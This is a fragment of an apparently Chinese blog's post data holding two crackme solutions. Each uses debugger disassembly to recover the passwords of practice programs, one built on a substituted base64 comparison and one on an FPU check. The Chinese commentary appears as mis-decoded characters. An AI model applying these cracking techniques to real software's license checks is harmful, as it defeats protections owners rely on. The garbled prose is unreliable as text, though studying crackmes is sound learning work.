jne reverse3.1241274 | 0124126D | 68 78 21 24 01 | push reverse3.1242178 | 1242178:\u0026#34;this is the right flag\u0026#34; 01241272 | EB 05 | jmp reverse3.1241279 | 01241274 | 68 90 21 24 01 | push reverse3.1242190 | 1242190:\u0026#34;wrong input\u0026#34; 01241279 | FF 15 B0 20 24 01 | call dword ptr ds:[\u0026lt;\u0026amp;puts\u0026gt;] | 0124127F | 8B 4D FC | mov ecx,dword ptr ss:[ebp-4] | 01241282 | 83 C4 04 | add esp,4 | 01241285 | 33 CD | xor ecx,ebp | 01241287 | 33 C0 | xor eax,eax | eax:\u0026#34;OTacMDMzMTI=\u0026#34; 01241289 | E8 92 00 00 00 | call reverse3.1241320 | 0124128E | 8B E5 | mov esp,ebp | 01241290 | 5D | pop ebp | 01241291 | C3 | ret | çœ‹æ¥æ˜¯è¿™å‡ è¡Œåšäº†æ‰‹è„šï¼Œå‹å…¥äº†ä¸¤ä¸ªå‚æ•°\n1 2 3 01241259 | 68 40 21 24 01 | push reverse3.1242140 | 1242140:\u0026#34;o2Ffx3V0OjJtYW5spQ==\u0026#34; 0124125E | 50 | push eax | eax:\u0026#34;OTacMDMzMTI=\u0026#34; 0124125F | FF 15 C4 20 24 01 | call dword ptr ds:[\u0026lt;\u0026amp;strncmp\u0026gt;] | ç»è¿‡å¤„ç†çš„base64ä¸å†…ç½®base64å€¼æ¯”è¾ƒï¼Œç›¸ç­‰=\u0026gt;eax=0 æˆ‘ä»¬è·Ÿè¿™ä¸ªcallè¿›å»çœ‹çœ‹\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 6C2F8C30 | 53 | push ebx | 6C2F8C31 | 56 | push esi | esi:\u0026#34;TacMDMzMTI=\u0026#34; 6C2F8C32 | 8B 4C 24 0C | mov ecx,dword ptr ss:[esp+C] | æˆ‘ä»¬è¾“å…¥çš„base64å˜å½¢åçš„å€¼ 6C2F8C36 | 8B 54 24 10 | mov edx,dword ptr ss:[esp+10] | å†…ç½®base64å€¼ 6C2F8C3A | 8B 5C 24 14 | mov ebx,dword ptr ss:[esp+14] | 6C2F8C3E | F7 C3 FF FF FF FF | test ebx,FFFFFFFF | 6C2F8C44 | 74 50 | je ucrtbase.6C2F8C96 | 6C2F8C46 | 2B CA | sub ecx,edx | 6C2F8C48 | F7 C2 03 00 00 00 | test edx,3 | 6C2F8C4E | 74 17 | je ucrtbase.6C2F8C67 | 6C2F8C50 | 0F B6 04 0A | movzx eax,byte ptr ds:[edx+ecx] | edx+ecx*1:\u0026#34;OTacMDMzMTI=\u0026#34; 6C2F8C54 | 3A 02 | cmp al,byte ptr ds:[edx] | 6C2F8C56 | 75 48 | jne ucrtbase.6C2F8CA0 | 6C2F8C58 | 85 C0 | test eax,eax | eax:\u0026#34;OTacMDMzMTI=\u0026#34; 6C2F8C5A | 74 3A | je ucrtbase.6C2F8C96 | 6C2F8C5C | 42 | inc edx | 6C2F8C5D | 83 EB 01 | sub ebx,1 | 6C2F8C60 | 76 34 | jbe ucrtbase.6C2F8C96 | 6C2F8C62 | F6 C2 03 | test dl,3 | 6C2F8C65 | 75 E9 | jne ucrtbase.6C2F8C50 | 6C2F8C67 | 8D 04 0A | lea eax,dword ptr ds:[edx+ecx] | eax:\u0026#34;OTacMDMzMTI=\u0026#34; 6C2F8C6A | 25 FF 0F 00 00 | and eax,FFF | eax:\u0026#34;OTacMDMzMTI=\u0026#34; 6C2F8C6F | 3D FC 0F 00 00 | cmp eax,FFC | eax:\u0026#34;OTacMDMzMTI=\u0026#34; 6C2F8C74 | 77 DA | ja ucrtbase.6C2F8C50 | 6C2F8C76 | 8B 04 0A | mov eax,dword ptr ds:[edx+ecx] | eax:\u0026#34;OTacMDMzMTI=\u0026#34; 6C2F8C79 | 3B 02 | cmp eax,dword ptr ds:[edx] | eax:\u0026#34;OTacMDMzMTI=\u0026#34; 6C2F8C7B | 75 D3 | jne ucrtbase.6C2F8C50 | 6C2F8C7D | 83 EB 04 | sub ebx,4 | 6C2F8C80 | 76 14 | jbe ucrtbase.6C2F8C96 | 6C2F8C82 | 8D B0 FF FE FE FE | lea esi,dword ptr ds:[eax-1010101] | esi:\u0026#34;TacMDMzMTI=\u0026#34; 6C2F8C88 | 83 C2 04 | add edx,4 | 6C2F8C8B | F7 D0 | not eax | eax:\u0026#34;OTacMDMzMTI=\u0026#34; 6C2F8C8D | 23 C6 | and eax,esi | eax:\u0026#34;OTacMDMzMTI=\u0026#34;, esi:\u0026#34;TacMDMzMTI=\u0026#34; 6C2F8C8F | A9 80 80 80 80 | test eax,80808080 | eax:\u0026#34;OTacMDMzMTI=\u0026#34; 6C2F8C94 | 74 D1 | je ucrtbase.6C2F8C67 | 6C2F8C96 | 33 C0 | xor eax,eax | eax:\u0026#34;OTacMDMzMTI=\u0026#34; 6C2F8C98 | 5E | pop esi | esi:\u0026#34;TacMDMzMTI=\u0026#34; 6C2F8C99 | 5B | pop ebx | 6C2F8C9A | C3 | ret | 6C2F8C9B | EB 03 | jmp ucrtbase.6C2F8CA0 | 6C2F8C9D | CC | int3 | 6C2F8C9E | CC | int3 | 6C2F8C9F | CC | int3 | 6C2F8CA0 | 1B C0 | sbb eax,eax | eax:\u0026#34;OTacMDMzMTI=\u0026#34; 6C2F8CA2 | 83 C8 01 | or eax,1 | eax:\u0026#34;OTacMDMzMTI=\u0026#34; 6C2F8CA5 | 5E | pop esi | esi:\u0026#34;TacMDMzMTI=\u0026#34; 6C2F8CA6 | 5B | pop ebx | 6C2F8CA7 | C3 | ret | è¿™æ®µä»£ç çš„è·³è½¬æ¯”è¾ƒå¤æ‚ï¼Œæˆ‘ä»¬ä¸»è¦çœ‹è¿™æ®µ\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 6C2F8C50 | 0F B6 04 0A | movzx eax,byte ptr ds:[edx+ecx] | edx+ecx*1:\u0026#34;OTacMDMzMTI=\u0026#34; 6C2F8C54 | 3A 02 | cmp al,byte ptr ds:[edx] | edx:\u0026#34;o2Ffx3V0OjJtYW5spQ==\u0026#34; 6C2F8C56 | 75 48 | jne ucrtbase.6C2F8CA0 | 6C2F8C58 | 85 C0 | test eax,eax | 6C2F8C5A | 74 3A | je ucrtbase.6C2F8C96 | 6C2F8C5C | 42 | inc edx | edx:\u0026#34;o2Ffx3V0OjJtYW5spQ==\u0026#34; 6C2F8C5D | 83 EB 01 | sub ebx,1 | 6C2F8C60 | 76 34 | jbe ucrtbase.6C2F8C96 | 6C2F8C62 | F6 C2 03 | test dl,3 | 6C2F8C65 | 75 E9 | jne ucrtbase.6C2F8C50 | 6C2F8C67 | 8D 04 0A | lea eax,dword ptr ds:[edx+ecx] | edx+ecx*1:\u0026#34;OTacMDMzMTI=\u0026#34; 6C2F8C6A | 25 FF 0F 00 00 | and eax,FFF | 6C2F8C6F | 3D FC 0F 00 00 | cmp eax,FFC | 6C2F8C74 | 77 DA | ja ucrtbase.6C2F8C50 | é€šè¯»å¯ä»¥å‘ç°å°±æ˜¯æŠŠæˆ‘ä»¬è¾“å…¥çš„base64å˜å½¢åçš„å€¼(OTacMDMzMTI=)æŒ‰å­—èŠ‚å–å‡ºæ¥ä¸€ä¸€å’Œå†…ç½®çš„o2Ffx3V0OjJtYW5spQ==åšæ¯”è¾ƒï¼Œåªæœ‰å½“å…¨éƒ¨ç›¸ç­‰æ‰è·³åˆ°è¿™æŠŠeaxç½®é›¶\n1 6C2F8C96 | 33 C0 | xor eax,eax ç„¶åé€€å‡ºå‡½æ•°\né‚£ä¹ˆè¿™ä¸ªOTacMDMzMTI=æ˜¯ä¸ªä»€ä¹ˆå‘¢ï¼Ÿçœ‹ç€æ˜¯ä¸ªbase64ï¼Œä½†æ˜¯æˆ‘ä»¬è§£å‡ºæ¥æ˜¯96?3312ï¼Œå®Œå…¨ä¸æ˜¯æˆ‘ä»¬è¾“å…¥çš„97103012äº†ï¼Œè¿™ä¸ªåªæ€ä¹ˆæ¥çš„å‘¢ï¼Ÿæˆ‘ä»¬ç»§ç»­çœ‹è¿™æ®µ\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 012411FF | 8D 4D C0 | lea ecx,dword ptr ss:[ebp-40] | 01241202 | E8 F9 FD FF FF | call reverse3.1241000 |base64(ä½ çš„è¾“å…¥) -\u0026gt; [ebp - 0x40] 01241207 | 8D 4D C0 | lea ecx,dword ptr ss:[ebp-40] | 0124120A | 83 C4 08 | add esp,8 | 0124120D | 33 D2 | xor edx,edx | edx:\u0026#34;97103012\u0026#34; 0124120F | 8D 71 01 | lea esi,dword ptr ds:[ecx+1] | 01241212 | 8A 01 | mov al,byte ptr ds:[ecx] | 01241214 | 41 | inc ecx | 01241215 | 84 C0 | test al,al | 01241217 | 75 F9 | jne reverse3.1241212 | 01241219 | 2B CE | sub ecx,esi | é•¿åº¦ï¼ˆbase64ä½ çš„è¾“å…¥ï¼‰ -\u0026gt; ecx 0124121B | 74 37 | je reverse3.1241254 | 0124121D | 0F 1F 00 | nop dword ptr ds:[eax] | 01241220 | 8A 4C 15 C0 | mov cl,byte ptr ss:[ebp+edx-40] | 01241224 | 33 C0 | xor eax,eax | 01241226 | 3A 88 08 21 24 01 | cmp cl,byte ptr ds:[eax+1242108] | eax+1242108:\u0026#34;abcdefghijklmnopqrstuvwxyz\u0026#34; 0124122C | 74 08 | je reverse3.1241236 | 0124122E | 40 | inc eax | 0124122F | 83 F8 1A | cmp eax,1A | 01241232 | 72 F2 | jb reverse3.1241226 | 01241234 | EB 0A | jmp reverse3.1241240 | 01241236 | 8A 80 24 21 24 01 | mov al,byte ptr ds:[eax+1242124] | eax+1242124:\u0026#34;wxabopdefghijklqrstuvyzcmn\u0026#34; 0124123C | 88 44 15 C0 | mov byte ptr ss:[ebp+edx-40],al | 01241240 | 8D 4D C0 | lea ecx,dword ptr ss:[ebp-40] | 01241243 | 42 | inc edx | edx:\u0026#34;97103012\u0026#34; 01241244 | 8D 71 01 | lea esi,dword ptr ds:[ecx+1] | 01241247 | 8A 01 | mov al,byte ptr ds:[ecx] | 01241249 | 41 | inc ecx | 0124124A | 84 C0 | test al,al | 0124124C | 75 F9 | jne reverse3.1241247 | 0124124E | 2B CE | sub ecx,esi | 01241250 | 3B D1 | cmp edx,ecx | edx:\u0026#34;97103012\u0026#34; 01241252 | 72 CC | jb reverse3.1241220 | 01241254 | 6A 14 | push 14 | ä¸‹é¢è¿™è¡Œä»£ç æœ‰å…´è¶£çš„å¯ä»¥è·Ÿè¿›å»çœ‹çœ‹ï¼Œå…¶å®å°±æ˜¯base64ç¼–ç ï¼Œè‹¦é€¼çš„æˆ‘å‚»ä¹ä¹åœ°è·Ÿå®Œäº†\n1 01241202 | E8 F9 FD FF FF | call reverse3.1241000 |base64(ä½ çš„è¾“å…¥) -\u0026gt; [ebp - 0x40] é‚£97103012çš„base64æ˜¯OTcxMDMwMTI=å‘€ï¼Œè¿™ä¸ªOTacMDMzMTI=æ˜¯æ€ä¹ˆæ¥çš„å‘¢ï¼Ÿæˆ‘ä»¬çœ‹ç€ä¸€æ®µ\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 01241220 | 8A 4C 15 C0 | mov cl,byte ptr ss:[ebp+edx-40] | 01241224 | 33 C0 | xor eax,eax | 01241226 | 3A 88 08 21 24 01 | cmp cl,byte ptr ds:[eax+1242108] | eax+1242108:\u0026#34;abcdefghijklmnopqrstuvwxyz\u0026#34; 0124122C | 74 08 | je reverse3.1241236 | 0124122E | 40 | inc eax | 0124122F | 83 F8 1A | cmp eax,1A | 01241232 | 72 F2 | jb reverse3.1241226 | 01241234 | EB 0A | jmp reverse3.1241240 | 01241236 | 8A 80 24 21 24 01 | mov al,byte ptr ds:[eax+1242124] | eax+1242124:\u0026#34;wxabopdefghijklqrstuvyzcmn\u0026#34; 0124123C | 88 44 15 C0 | mov byte ptr ss:[ebp+edx-40],al | 01241240 | 8D 4D C0 | lea ecx,dword ptr ss:[ebp-40] | 01241243 | 42 | inc edx | edx:\u0026#34;97103012\u0026#34; 01241244 | 8D 71 01 | lea esi,dword ptr ds:[ecx+1] | 01241247 | 8A 01 | mov al,byte ptr ds:[ecx] | 01241249 | 41 | inc ecx | 0124124A | 84 C0 | test al,al | 0124124C | 75 F9 | jne reverse3.1241247 | 0124124E | 2B CE | sub ecx,esi | 01241250 | 3B D1 | cmp edx,ecx | edx:\u0026#34;97103012\u0026#34; 01241252 | 72 CC | jb reverse3.1241220 | è¿™ä¸€æ®µçš„å·¥ä½œå¤§å®¶è·Ÿè·Ÿå°±çŸ¥é“ï¼Œå°±æ˜¯é€šè¿‡ä¸€æ¬¡æ¬¡å¾ªç¯å°†OTcxMDMwMTI=ä¸­çš„å€¼é€šè¿‡ä¸‹é¢è¿™ä¸ªå¯¹åº”å…³ç³»ä¸€ä¸€ç½®æ¢\n1 2 abcdefghijklmnopqrstuvwxyz wxabopdefghijklqrstuvyzcmn æ‰€ä»¥OTcxMDMwMTI=å˜æˆäº†OTacMDMzMTI=\nå¥½çš„ï¼Œæˆ‘ä»¬çœ‹åˆ°äº†è¿™é‡Œï¼Œç›¸ä¿¡å·²ç»çŸ¥é“å¯†ç æ˜¯ä»€ä¹ˆäº†ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬å˜å½¢åçš„base64å€¼è¦ç­‰äºo2Ffx3V0OjJtYW5spQ==\né‚£å°±å€’ç€ç½®æ¢å‘—ï¼Œå¾—å‡ºæ¥æ­£ç¡®çš„base64æ˜¯e2Fib3V0OmJsYW5rfQ==ï¼Œè§£ç ä¸º{about:blank}\nä¾‹å­CM\n","permalink":"https://www.hacktech.cn/post/%E4%B8%80%E4%B8%AA%E6%9F%A5%E8%A1%A8%E7%BD%AE%E6%8D%A2%E7%9A%84cm.html","summary":"\u003cp\u003eè¯´å®è¯ï¼Œä»Šå¤©è¢«è‡ªå·±è ¢å“­äº†\u003c/p\u003e\n\u003cp\u003eå› ä¸ºçœ‹å¤šäº†ä¸€ä¸ªå­—ç¬¦ï¼Œä»¥ä¸ºæ˜¯è¾“å…¥å­—ç¬¦å˜å½¢åçš„base64ç¼–ç ï¼Œä¹Ÿæ€ªè‡ªå·±æ²¡å¤§è‡´çœ‹è¿‡base64æ±‡ç¼–å½¢å¼ï¼ŒæŠŠbase64è·Ÿå®Œäº†ç”¨pyå®ç°å®Œç®—æ³•æ‰æ„æ€åˆ°æ˜¯base64ï¼Œè¿™æ˜¯é¢˜å¤–è¯\u003c/p\u003e","title":"ä¸€ä¸ªæŸ¥è¡¨ç½®æ¢çš„CM"},{"content":"è¿™æ¬¡æ‰¾å°ä¼™ä¼´è¦äº†ä»–çš„ä¸€ä¸ªCMï¼Œæ€ä¹ˆè¯´å‘¢ï¼Œè¿™CMè®©æˆ‘å­¦åˆ°äº†ä¸å°‘ï¼Œå…¶å®æå‡ºæ¥åæ„Ÿè§‰ä¸éš¾ï¼Œå°±æ˜¯æœ‰ä¸å°‘FPUæµ®ç‚¹ç›¸å…³çš„æŒ‡ä»¤å’ŒFPUå¯„å­˜å™¨å®Œå…¨æ²¡å­¦è¿‡ï¼ŒæŸ¥äº†ä¸å°‘èµ„æ–™ï¼Œå­¦åˆ°äº†å¾ˆå¤š\næ‰“å¼€æ˜¯è¿™æ ·\næ— å£³ç¨‹åºï¼Œæˆ‘ä»¬ç›´æ¥odæŸ¥æ‰¾å­—ç¬¦ä¸²ï¼Œçˆ†ç ´æˆ‘å°±ä¸è¯´äº†ï¼Œç›´æ¥æ”¹è·³è½¬\næˆ‘ç¬¬ä¸€æ¬¡æ˜¯æ‰¾åˆ°è¿™ä¸ªåˆ¤æ–­çš„å‡½æ•°å¼€å¤´ï¼Œä¸€è¡Œè¡Œå¿«é€Ÿå•æ­¥ï¼Œç¡®å®å‘ç°äº†è¾“å…¥ï¼Œä½†æ˜¯åæ¥å¾ˆå¤šå‘½ä»¤ä¸æ‡‚æ„æ€æˆ‘ä¹Ÿå•æ­¥ï¼Œå¯¼è‡´çœ‹åˆ°åæ¥ä¹Ÿä¸çŸ¥é“æ€ä¹ˆåˆ¤æ–­çš„\nç„¶åæˆ‘æ”¹äº†ç­–ç•¥ï¼Œå…ˆé€†ç€å°±è¿‘çœ‹çœ‹ï¼Œæ€ä¹ˆæ‰èƒ½ä½¿æ¡ä»¶æˆç«‹\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 004010EA |. F6C4 41 test ah,0x41 ; zf=0 -\u0026gt; ah \u0026amp; 0x41 != 0 004010ED |. B8 00000000 mov eax,0x0 004010F2 |. 0f95c0 setne al ; eax=1 -\u0026gt; al=1 -\u0026gt; zf=0 004010F5 |. 8945 D0 mov [local.12],eax 004010F8 |. 837D D0 01 cmp [local.12],0x1 004010FC |. 0F85 39000000 jnz æµ‹è¯•.0040113B ; è¦æ±‚zf=1ï¼Œå³eax=0x1 00401102 |. BB 06000000 mov ebx,0x6 00401107 |. E8 F8FEFFFF call æµ‹è¯•.00401004 0040110C |. 68 01030080 push 0x80000301 00401111 |. 6A 00 push 0x0 00401113 |. 68 00000000 push 0x0 00401118 |. 68 04000080 push 0x80000004 0040111D |. 6A 00 push 0x0 0040111F |. 68 6D1B4800 push æµ‹è¯•.00481B6D ; æˆåŠŸ 00401124 |. 68 04000000 push 0x4 00401129 |. BB 90164000 mov ebx,æµ‹è¯•.00401690 0040112E |. E8 36010000 call æµ‹è¯•.00401269 00401133 |. 83C4 34 add esp,0x34 00401136 |. E9 34000000 jmp æµ‹è¯•.0040116F 0040113B |\u0026gt; BB 06000000 mov ebx,0x6 00401140 |. E8 BFFEFFFF call æµ‹è¯•.00401004 00401145 |. 68 01030080 push 0x80000301 0040114A |. 6A 00 push 0x0 0040114C |. 68 00000000 push 0x0 00401151 |. 68 04000080 push 0x80000004 00401156 |. 6A 00 push 0x0 00401158 |. 68 721B4800 push æµ‹è¯•.00481B72 ; å¤±è´¥ 0040115D |. 68 04000000 push 0x4 ä¹Ÿå°±æ˜¯è¯´éœ€è¦æ‰¾ahç›¸å…³çš„\næ¥ä¸‹æ¥æˆ‘ä»¬æ•´ä½“çœ‹çœ‹ï¼Œå› ä¸ºç¬¬ä¸€æ¬¡æ¥è§¦FPUæµ®ç‚¹ç›¸å…³çš„æŒ‡ä»¤å’ŒFPUå¯„å­˜å™¨ï¼Œæ‰€ä»¥æ³¨é‡Šå†™çš„æ¯”è¾ƒç¹çï¼Œæœ›å¤§å®¶è§è°…\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 0040100C /. 55 push ebp 0040100D |. 8BEC mov ebp,esp 0040100F |. 81EC 34000000 sub esp,0x34 00401015 |. 6A FF push -0x1 00401017 |. 6A 08 push 0x8 00401019 |. 68 02000116 push 0x16010002 0040101E |. 68 01000152 push 0x52010001 00401023 |. E8 47020000 call æµ‹è¯•.0040126F ; æ‰§è¡Œå è¾“å…¥çš„å¯†ç  -\u0026gt; eax(1886b8) 00401028 |. 83C4 10 add esp,0x10 0040102B |. 8945 FC mov [local.1],eax ; eaxä¸­ä½ çš„è¾“å…¥ -\u0026gt; ebp-4 0040102E |. 68 04000080 push 0x80000004 00401033 |. 6A 00 push 0x0 00401035 |. 8B45 FC mov eax,[local.1] 00401038 |. 85C0 test eax,eax 0040103A |. 75 05 jnz short æµ‹è¯•.00401041 0040103C |. B8 5C1B4800 mov eax,æµ‹è¯•.00481B5C 00401041 |\u0026gt; 50 push eax 00401042 |. 68 01000000 push 0x1 00401047 |. BB A0134000 mov ebx,æµ‹è¯•.004013A0 0040104C |. E8 18020000 call æµ‹è¯•.00401269 ; eax=16è¿›åˆ¶(ä½ çš„è¾“å…¥) ecx=0 00401051 |. 83C4 10 add esp,0x10 ; esp = 1000b 00401054 |. 8945 F8 mov [local.2],eax ; 16è¿›åˆ¶(ä½ çš„è¾“å…¥) -\u0026gt; local.2 00401057 |. 8B5D FC mov ebx,[local.1] ; ä½ çš„è¾“å…¥ -\u0026gt; ebx 0040105A |. 85DB test ebx,ebx 0040105C |. 74 09 je short æµ‹è¯•.00401067 0040105E |. 53 push ebx ; è¾“å…¥å‹æ ˆ ebp-38 local.14 0040105F |. E8 F9010000 call æµ‹è¯•.0040125D 00401064 |. 83C4 04 add esp,0x4 ; [ebp-38] + 4 00401067 |\u0026gt; DB45 F8 fild [local.2] ; åè¿›åˆ¶æµ®ç‚¹(è¾“å…¥) -\u0026gt; st0 0040106A |. DD5D F0 fstp qword ptr ss:[ebp-0x10] ; st0 -\u0026gt; ebp-10H 0040106D |. DD45 F0 fld qword ptr ss:[ebp-0x10] ; ebp-10 -\u0026gt; st0 00401070 |. DC05 5D1B4800 fadd qword ptr ds:[0x481B5D] ; st0 = st0 + 520 00401076 |. DD5D E8 fstp qword ptr ss:[ebp-0x18] ; åè¿›åˆ¶ä½ çš„è¾“å…¥+520 -\u0026gt; ebp-18H 00401079 |. 6A FF push -0x1 0040107B |. 6A 08 push 0x8 0040107D |. 68 03000116 push 0x16010003 00401082 |. 68 01000152 push 0x52010001 00401087 |. E8 E3010000 call æµ‹è¯•.0040126F 0040108C |. 83C4 10 add esp,0x10 0040108F |. 8945 E4 mov [local.7],eax 00401092 |. 68 04000080 push 0x80000004 00401097 |. 6A 00 push 0x0 00401099 |. 8B45 E4 mov eax,[local.7] 0040109C |. 85C0 test eax,eax 0040109E |. 75 05 jnz short æµ‹è¯•.004010A5 004010A0 |. B8 5C1B4800 mov eax,æµ‹è¯•.00481B5C 004010A5 |\u0026gt; 50 push eax 004010A6 |. 68 01000000 push 0x1 004010AB |. BB A0134000 mov ebx,æµ‹è¯•.004013A0 004010B0 |. E8 B4010000 call æµ‹è¯•.00401269 004010B5 |. 83C4 10 add esp,0x10 004010B8 |. 8945 E0 mov [local.8],eax 004010BB |. 8B5D E4 mov ebx,[local.7] 004010BE |. 85DB test ebx,ebx 004010C0 |. 74 09 je short æµ‹è¯•.004010CB 004010C2 |. 53 push ebx 004010C3 |. E8 95010000 call æµ‹è¯•.0040125D 004010C8 |. 83C4 04 add esp,0x4 004010CB |\u0026gt; DB45 E0 fild [local.8] ; (641)10 -\u0026gt; st0 004010CE |. DD5D D8 fstp qword ptr ss:[ebp-0x28] ; st0 -\u0026gt; ebp-28H 004010D1 |. DD45 E8 fld qword ptr ss:[ebp-0x18] ; [ebp-18H](åè¿›åˆ¶ä½ çš„è¾“å…¥+520) -\u0026gt; st0 004010D4 |. DC65 D8 fsub qword ptr ss:[ebp-0x28] ; st0 = st0 - [ebp-28H] (641)10 004010D7 |. D9E4 ftst ; st0å’Œ0.0æ¯”è¾ƒï¼Œæ®æ­¤è®¾ç½®FPUçŠ¶æ€å­—C0,C2,C3ä½ 004010D9 |. DFE0 fstsw ax 004010DB |. F6C4 01 test ah,0x1 004010DE |. 74 02 je short æµ‹è¯•.004010E2 004010E0 |. D9E0 fchs ; st0æ”¹å˜ç¬¦å·ä½ 004010E2 |\u0026gt; DC1D 651B4800 fcomp qword ptr ds:[0x481B65] ; st0å’Œ[481B65](æ— é™æ¥è¿‘0çš„ä¸€ä¸ªæ­£æµ®ç‚¹æ•°)æ¯”è¾ƒï¼Œæ®æ­¤è®¾ç½®FPUçŠ¶æ€å­—C0,C2,C3ä½ï¼Œå¹¶æŠŠst0å¼¹åˆ°[481B65] 004010E8 |. DFE0 fstsw ax ; FPUçŠ¶æ€å­— -\u0026gt; eaxï¼Œæ ¹æ®ä¸‹é¢å¯çŸ¥ï¼ŒFPUçŠ¶æ€å­—C0æˆ–C3ä¸º1å‡å¯ 004010EA |. F6C4 41 test ah,0x41 ; zf=0 -\u0026gt; ah \u0026amp; 0x41 != 0 004010ED |. B8 00000000 mov eax,0x0 004010F2 |. 0f95c0 setne al ; eax=1 -\u0026gt; al=1 -\u0026gt; zf=0 004010F5 |. 8945 D0 mov [local.12],eax 004010F8 |. 837D D0 01 cmp [local.12],0x1 004010FC |. 0F85 39000000 jnz æµ‹è¯•.0040113B ; è¦æ±‚zf=1ï¼Œå³eax=0x1 00401102 |. BB 06000000 mov ebx,0x6 00401107 |. E8 F8FEFFFF call æµ‹è¯•.00401004 0040110C |. 68 01030080 push 0x80000301 00401111 |. 6A 00 push 0x0 00401113 |. 68 00000000 push 0x0 00401118 |. 68 04000080 push 0x80000004 0040111D |. 6A 00 push 0x0 0040111F |. 68 6D1B4800 push æµ‹è¯•.00481B6D ; æˆåŠŸ 00401124 |. 68 04000000 push 0x4 00401129 |. BB 90164000 mov ebx,æµ‹è¯•.00401690 0040112E |. E8 36010000 call æµ‹è¯•.00401269 00401133 |. 83C4 34 add esp,0x34 00401136 |. E9 34000000 jmp æµ‹è¯•.0040116F 0040113B |\u0026gt; BB 06000000 mov ebx,0x6 00401140 |. E8 BFFEFFFF call æµ‹è¯•.00401004 00401145 |. 68 01030080 push 0x80000301 0040114A |. 6A 00 push 0x0 0040114C |. 68 00000000 push 0x0 00401151 |. 68 04000080 push 0x80000004 00401156 |. 6A 00 push 0x0 00401158 |. 68 721B4800 push æµ‹è¯•.00481B72 ; å¤±è´¥ 0040115D |. 68 04000000 push 0x4 é‚£ä¹ˆå›åˆ°ä¸Šé¢çš„é—®é¢˜ï¼Œahçš„å€¼æ˜¯ä»å“ªæ¥çš„ï¼Œæˆ‘ä»¬åœ¨004010E8å¤„å¯ä»¥çœ‹åˆ°ï¼ŒFPUçŠ¶æ€ç è¿›äº†eax\né‚£ä¹ˆæ ¹æ®æˆ‘ä»¬çš„åˆ¤æ–­ah \u0026amp; 0x41 != 0ï¼Œèƒ½å¾—å‡ºå¯¹FPUçŠ¶æ€å­—æœ‰ä»€ä¹ˆè¦æ±‚å‘¢ï¼Ÿ\næˆ‘ä»¬çœ‹è¿™å¼ å›¾\nä¹Ÿå°±æ˜¯è¯´\n1 2 3 4 5 0100 0001 \u0026amp; -x-- -yzt ---------------- çœŸ å…¶ä¸­xä»£è¡¨C3ï¼Œyä»£è¡¨C2ï¼Œzä»£è¡¨C1,tä»£è¡¨C0 æ ¹æ®ä¸Šé¢çš„åˆ¤æ–­ï¼Œä¹Ÿå°±æ˜¯è¯´åªèƒ½C3æˆ–C0ä¸º1\nC3ä¸º1çš„è¯ 1 004010E2 |\u0026gt; DC1D 651B4800 fcomp qword ptr ds:[0x481B65] ; st0å’Œ[481B65](æ— é™æ¥è¿‘0çš„ä¸€ä¸ªæ­£æµ®ç‚¹æ•°)æ¯”è¾ƒï¼Œæ®æ­¤è®¾ç½®FPUçŠ¶æ€å­—C0,C2,C3ä½ï¼Œå¹¶æŠŠst0å¼¹åˆ°[481B65] è¿™æ®µå°±æ˜¯st0ç­‰äºä¸€ä¸ªæ— é™æ¥è¿‘0çš„æµ®ç‚¹æ•°æ‰èƒ½ä½¿C3ä¸º1ï¼Œä½†æ˜¯æ ¹æ®æˆ‘ä»¬ä¹‹å‰çš„st0 = st0 = ä½ çš„è¾“å…¥+520-641ï¼Œst0ä¸å¯èƒ½æ˜¯ç­‰äºä¸€ä¸ªæ— é™æ¥è¿‘0çš„æµ®ç‚¹æ•°ï¼Œæ‰€ä»¥C3ä¸º1æ’é™¤ fcompå‘½ä»¤å‚è€ƒå¤„\nC0ä¸º1çš„è¯\nC0ä¸º1æ˜¯æ€ä¹ˆæ¥çš„å‘¢ï¼Ÿåªæœ‰ä¸¤ä¸ªåœ°æ–¹æ¶‰åŠåˆ°äº†FPUçŠ¶æ€å­—çš„æ”¹å˜ï¼Œåˆ†åˆ«æ˜¯4010D7å’Œ4010E2\n4010E2å¤„è¦ä½¿C0ä¸º1ï¼Œå¿…é¡»st0å°äºé‚£ä¸ªæ— é™æ¥è¿‘0çš„æµ®ç‚¹æ•°ï¼Œè¿™ä¸ªæ¡ä»¶ä¸è¶³ä»¥æˆ‘ä»¬åˆ¤æ–­ï¼Œæ¥ç€å¾€ä¸Šçœ‹\n4010D7å¤„è¦ä½¿C0ä¸º1ï¼Œå¿…é¡»st0ç­‰äº0.0ï¼Œä¹Ÿå°±æ˜¯ä½ çš„è¾“å…¥+520-641=0 ftstå‘½ä»¤å‚è€ƒå¤„ æ‰€ä»¥è‡³æ­¤æˆ‘ä»¬å°±å¾—åˆ°äº†å¯†ç \nå¯†ç +520-641=0 ==\u0026gt; å¯†ç =121\nè¿™ä¸ªCMæ€ä¹ˆè¯´å‘¢ï¼Œæˆ‘åˆšå¼€å§‹æ˜¯æ²¡æƒ³åˆ°ä¼šæ¶‰åŠåˆ°æµ®ç‚¹å¯„å­˜å™¨çš„ï¼Œå› ä¸ºæˆ‘è¿˜æ²¡å­¦è¿™ä¸ªï¼Œä¸è¿‡åæ¥è¿½åˆ°å¿«åˆ¤æ–­çš„åœ°æ–¹æ—¶ï¼Œå‘ç°äº†FPUçŠ¶æ€ç è¿›å…¥eaxå‚ä¸è¿‡ç¨‹äº†ï¼Œç„¶åæŸ¥äº†å…³äºFPU 